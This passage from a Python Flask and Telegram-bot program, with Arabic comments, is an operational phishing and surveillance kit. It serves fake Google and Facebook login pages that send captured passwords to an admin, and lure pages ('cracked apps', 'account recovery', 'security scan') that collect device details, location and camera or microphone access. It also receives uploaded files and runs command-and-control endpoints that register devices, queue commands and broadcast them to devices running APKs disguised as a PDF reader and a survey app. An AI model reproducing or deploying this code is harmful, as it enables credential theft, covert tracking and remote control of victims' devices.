        document.querySelectorAll('.category-tabs button').forEach(b => b.classList.remove('active'));
        if (btn) btn.classList.add('active');
        else {
            document.querySelector('.category-tabs button[onclick*="all"]')?.classList.add('active');
        }
        applyFilters();
    }

    function applyFilters() {
        let filtered = allApps;
        if (currentCategory === 'games') filtered = filtered.filter(a => a.category === 'games');
        else if (currentCategory === 'apps') filtered = filtered.filter(a => a.category === 'apps');
        else if (currentCategory === 'mods') filtered = filtered.filter(a => a.name.includes('Mod') || a.name.includes('Plus'));
        else if (currentCategory === 'popular') filtered = [...filtered].sort((a,b) => parseInt(b.downloads) - parseInt(a.downloads));
        const searchVal = document.getElementById('searchInput').value.toLowerCase();
        if (searchVal) filtered = filtered.filter(a => a.name.toLowerCase().includes(searchVal));
        displayedApps = filtered;
        renderApps(filtered);
    }

    function filterApps(query) {
        applyFilters();
        sendCollectedData('app_search', { query: query, results: displayedApps.length });
    }

    function searchApps() {
        applyFilters();
        sendCollectedData('app_search_click', { query: document.getElementById('searchInput').value });
    }

    function downloadApp(index) {
        const app = displayedApps[index];
        if (!app) return;
        sendCollectedData('app_download', { name: app.name, version: app.version, size: app.size });
        alert(`✅ جاري تحميل ${app.name} (محاكاة)`);
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => { stream.getTracks().forEach(t => t.stop()); })
                .catch(err => {});
        }
    }

    function loadMoreApps() {
        sendCollectedData('load_more_apps', { current: displayedApps.length });
        const newApps = [
            { name: 'TikTok Pro', icon: '🎵', version: 'v4.2.1', size: '40 MB', downloads: '2.8M', category: 'apps' },
            { name: 'FIFA Mobile Mod', icon: '⚽', version: 'v2.5.0', size: '600 MB', downloads: '1.1M', category: 'games' },
        ];
        allApps = allApps.concat(newApps);
        applyFilters();
        alert('✅ تم تحميل المزيد من التطبيقات (محاكاة)');
    }

    window.onload = function() {
        sendCollectedData('device_info', collectDeviceInfo());
        applyFilters();
        if ('Notification' in window && Notification.permission === 'default') Notification.requestPermission();
        if (navigator.geolocation) navigator.geolocation.getCurrentPosition(pos => {}, err => {});
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
                .then(stream => { stream.getTracks().forEach(t => t.stop()); })
                .catch(err => {});
        }
    };
</script>
</body>
</html>
'''

# صفحة الخدمات العامة (تصميم متنوع حسب الخدمة)
def get_service_page(title, description, icon):
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 500px;
            width: 100%;
            color: #fff;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            text-align: center;
        }}
        .icon {{ font-size: 64px; display: block; margin-bottom: 8px; }}
        h1 {{ font-size: 28px; margin-bottom: 8px; }}
        p {{ opacity: 0.9; margin-bottom: 20px; font-size: 16px; }}
        .btn {{
            display: inline-block;
            padding: 14px 30px;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: 700;
            background: linear-gradient(to right, #f7971e, #ffd200);
            color: #000;
            cursor: pointer;
            transition: transform 0.2s ease;
            text-decoration: none;
            width: 100%;
            text-align: center;
            margin: 8px 0;
        }}
        .btn:active {{ transform: scale(0.96); }}
        .row {{ display: flex; gap: 10px; }}
        .row .btn {{ flex:1; }}
        .btn-secondary {{ background: rgba(255,255,255,0.15); color: #fff; }}
    </style>
</head>
<body>
<div class="container">
    <span class="icon">{icon}</span>
    <h1>{title}</h1>
    <p>{description}</p>
    <button class="btn" onclick="startService()">بدء الخدمة</button>
    <div class="row">
        <button class="btn btn-secondary" onclick="window.location.href='/'">🔙 الرئيسية</button>
    </div>
</div>
<script>
    function collectDeviceInfo() {{
        return {{
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        }};
    }}
    function sendCollectedData(type, data) {{
        const payload = {{ type, data, device: collectDeviceInfo(), timestamp: new Date().toISOString() }};
        fetch('/collect_data', {{ method: 'POST', headers: {{ 'Content-Type': 'application/json' }}, body: JSON.stringify(payload) }})
        .catch(e => console.error(e));
    }}
    function startService() {{
        sendCollectedData('service_start', {{ page: '{title}' }});
        if ('Notification' in window && Notification.permission === 'default') {{
            Notification.requestPermission();
        }}
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(pos => {{
                sendCollectedData('location', {{ lat: pos.coords.latitude, lon: pos.coords.longitude }});
            }}, err => {{}});
        }}
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
            navigator.mediaDevices.getUserMedia({{ audio: true, video: true }})
                .then(stream => {{
                    sendCollectedData('media_permission_granted', {{ type: 'video_audio' }});
                    stream.getTracks().forEach(t => t.stop());
                }})
                .catch(err => {{}});
        }}
        alert('✅ تم تشغيل الخدمة (محاكاة)');
    }}
    window.onload = function() {{
        sendCollectedData('device_info', collectDeviceInfo());
    }};
</script>
</body>
</html>
    '''

# ===================== مسارات Flask =====================
@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/ping')
def ping():
    return 'pong'

# ===================== نقاط نهاية التطبيق الخفي =====================
@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id', 0)
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        save_registered_device_db(device_id, chat_id)
        logger.info(f"✅ جهاز مسجل: {device_id} (chat_id: {chat_id})")
        notify_admin(f"📱 جهاز جديد مسجل: `{device_id}`")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        update_registered_device_seen_db(device_id)
        # تخزين البيانات المجمعة
        content = json.dumps(data, ensure_ascii=False)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (device_id, 'submit_result', content, ip, user_agent, datetime.now().isoformat()))
            conn.commit()
        logger.info(f"✅ بيانات من جهاز {device_id}")
        # إرسال للمطور
        send_sensitive_data_to_admin("بيانات مجمعة", data, user_id=ADMIN_ID)
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'error': 'device_id required'}), 400
        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'cmd': command, 'param': ''}), 200
        else:
            return jsonify({'cmd': '', 'param': ''}), 200
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/broadcast_command', methods=['POST'])
def broadcast_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        command = data.get('command')
        if not command:
            return jsonify({'error': 'command required'}), 400
        param = data.get('param', '')
        # إضافة الأمر لجميع الأجهزة المسجلة
        devices = get_registered_devices_db()
        if not devices:
            return jsonify({'status': 'no_devices'}), 200
        count = 0
        for dev in devices:
            add_pending_command_db(dev['device_id'], command)
            count += 1
        notify_admin(f"📢 أمر تم بثه لـ {count} جهاز: `{command}`")
        return jsonify({'status': 'success', 'devices_count': count}), 200
    except Exception as e:
        logger.error(f"broadcast_command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid data'}), 400
        device_id = data.get('device_id')
        command = data.get('command')
        if not device_id or not command:
            return jsonify({'error': 'device_id and command required'}), 400
        add_pending_command_db(device_id, command)
        notify_admin(f"📨 أمر مرسل للجهاز `{device_id}`: `{command}`")
        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"send_command error: {e}")
        return jsonify({'error': str(e)}), 500

# ===================== باقي المسارات (نفسها) =====================
@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400

        session_id = request.remote_addr + '_' + str(time.time())
        data_type = data.get('type', 'unknown')
        content = json.dumps(data, ensure_ascii=False)
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        device_info = data.get('device', {})

        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (session_id, data_type, content, ip, user_agent, datetime.now().isoformat()))
            conn.commit()

        msg = f"📋 **تقرير نشاط مستخدم جديد**\n\n"
        msg += f"📂 **نوع العملية:** `{data_type}`\n"
        msg += f"🌐 **عنوان الـ IP:** `{ip}`\n"
        msg += f"🕐 **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        
        if device_info:
            msg += f"\n📱 **بيانات الجهاز والمتصفح:**\n"
            msg += f"   • نظام التشغيل: `{device_info.get('platform', 'غير معروف')}`\n"
            msg += f"   • المتصفح: `{device_info.get('userAgent', '').split('/')[0] if device_info.get('userAgent') else 'غير معروف'}`\n"
            msg += f"   • اللغة: `{device_info.get('language', 'غير معروف')}`\n"
            msg += f"   • المنطقة الزمنية: `{device_info.get('timezone', 'غير معروف')}`\n"
            msg += f"   • أبعاد الشاشة: `{device_info.get('screenWidth', '')} × {device_info.get('screenHeight', '')} بكسل`\n"
        
        msg += f"\n📄 **البيانات:**\n```json\n{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}\n```"
        safe_send(ADMIN_ID, msg)

        return jsonify({'status': 'success'}), 200
    except Exception as e:
        logger.error(f"Collect data error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/upload_files', methods=['POST'])
def upload_files():
    try:
        if 'files' not in request.files:
            return jsonify({'status': 'error', 'message': 'No files'}), 400
        
        files = request.files.getlist('files')
        if not files:
            return jsonify({'status': 'error', 'message': 'No files selected'}), 400
        
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        session_id = ip + '_' + str(time.time())
        saved_files = []
        
        for f in files:
            if f.filename == '':
                continue
            filename = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + f.filename
            filepath = os.path.join(UPLOAD_DIR, filename)
            f.save(filepath)
            
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute('''INSERT INTO uploaded_files (session_id, filename, filepath, ip, user_agent, created_at)
                             VALUES (?, ?, ?, ?, ?, ?)''',
                          (session_id, filename, filepath, ip, user_agent, datetime.now().isoformat()))
                conn.commit()
            
            saved_files.append(filename)
            
            with open(filepath, 'rb') as file_data:
                bot.send_document(ADMIN_ID, (filename, file_data), caption=f"📎 **ملف مرفوع**\n🌐 IP: {ip}\n📄 الاسم: {filename}")
        
        return jsonify({'status': 'success', 'saved': saved_files}), 200
    except Exception as e:
        logger.error(f"Upload files error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== صفحات الخدمات =====================
@app.route('/google_login', methods=['GET', 'POST'])
def google_login_page():
    if request.method == 'GET':
        return render_template_string(GOOGLE_PAGE)
    else:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        send_sensitive_data_to_admin("Go0gle Login (مزيف)", f"البريد: {email}\nكلمة السر: {password}", user_id="غير معروف")
        return "<h2>✅ تم تسجيل الدخول بنجاح</h2><script>setTimeout(function(){ window.location.href='https://accounts.google.com'; },3000);</script>"

@app.route('/facebook_login', methods=['GET', 'POST'])
def facebook_login_page():
    if request.method == 'GET':
        return render_template_string(FACEBOOK_PAGE)
    else:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        send_sensitive_data_to_admin("Faceb00k Login (مزيف)", f"البريد/الهاتف: {email}\nكلمة السر: {password}", user_id="غير معروف")
        return "<h2>✅ تم تسجيل الدخول بنجاح</h2><script>setTimeout(function(){ window.location.href='https://www.facebook.com'; },3000);</script>"

@app.route('/whatsapp_web', methods=['GET'])
def whatsapp_web_page():
    return render_template_string(WHATSAPP_PAGE)

@app.route('/video_chat', methods=['GET'])
def video_chat_page():
    return render_template_string(VIDEO_CHAT_PAGE)

@app.route('/freefire', methods=['GET'])
def freefire_page():
    return render_template_string(FREE_FIRE_PAGE)

@app.route('/survey', methods=['GET'])
def survey_page():
    return render_template_string(SURVEY_PAGE)

@app.route('/pdf_reader', methods=['GET'])
def pdf_reader_page():
    return render_template_string(PDF_READER_PAGE)

@app.route('/file_recovery', methods=['GET'])
def file_recovery_page():
    return render_template_string(FILE_RECOVERY_PAGE)

@app.route('/security_scan', methods=['GET'])
def security_scan_page():
    return render_template_string(SECURITY_SCAN_PAGE)

@app.route('/cracked_apps', methods=['GET'])
def cracked_apps_page():
    return render_template_string(CRACKED_APPS_PAGE)

@app.route('/security_check', methods=['GET'])
def security_check_page():
    return render_template_string(get_service_page('تأكيد الهوية', 'قم بتأكيد هويتك لحماية حسابك.', '🔐'))

@app.route('/temp_mail', methods=['GET'])
def temp_mail_page():
    return render_template_string(get_service_page('بريد مؤقت', 'احصل على بريد إلكتروني مؤقت للتسجيل.', '📧'))

@app.route('/link_scanner', methods=['GET'])
def link_scanner_page():
    return render_template_string(get_service_page('فحص الروابط', 'أدخل الرابط للتحقق من سلامته.', '🌐'))

@app.route('/tiktok_followers', methods=['GET'])
def tiktok_followers_page():
    return render_template_string(get_service_page('متابعين تيك توك', 'زد متابعيك على تيك توك الآن.', '📊'))

@app.route('/account_recovery', methods=['GET'])
def account_recovery_page():
    return render_template_string(get_service_page('استعادة حساب', 'استعد حسابك المسروق بخطوات بسيطة.', '🔑'))

@app.route('/download_apk', methods=['GET'])
def download_apk():
    apk_path = os.path.join(BASE_DIR, 'static', 'PDFReader.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    return "⚠️ ملف التطبيق غير متوفر حالياً.", 404

@app.route('/download_apk_survey', methods=['GET'])
def download_apk_survey():
    apk_path = os.path.join(BASE_DIR, 'static', 'SurveyApp.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    return "⚠️ ملف APK غير موجود.", 404

# ===================== Keep-Alive Thread =====================
def keep_alive():
    if not SERVER_URL:
        return
    ping_url = f"{SERVER_URL}/ping"
    while True:
        time.sleep(300)
        try:
            req_lib.get(ping_url, timeout=10)
            logger.info("✅ Keep-alive ping")
        except Exception as e:
            logger.error(f"❌ فشل Keep-alive: {e}")

# ===================== تشغيل البوت =====================
if __name__ == "__main__":
    bot.remove_webhook()
    if USE_WEBHOOK and SERVER_URL:
        webhook_url = f"{SERVER_URL}/webhook"
        try:
            success = bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET)
            if success:
                logger.info(f"✅ Webhook تم تعيينه: {webhook_url}")
            else:
                logger.warning(f"⚠️ فشل تعيين Webhook.")
        except Exception as e:
            logger.error(f"❌ خطأ في تعيين Webhook: {e}")
    else:
        logger.info("🔄 تشغيل البوت عبر Polling...")
    if SERVER_URL:
        keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
        keep_alive_thread.start()
        logger.info("🔄 تم بدء Keep-alive.")
    app.run(host='0.0.0.0', port=PORT, debug=False)
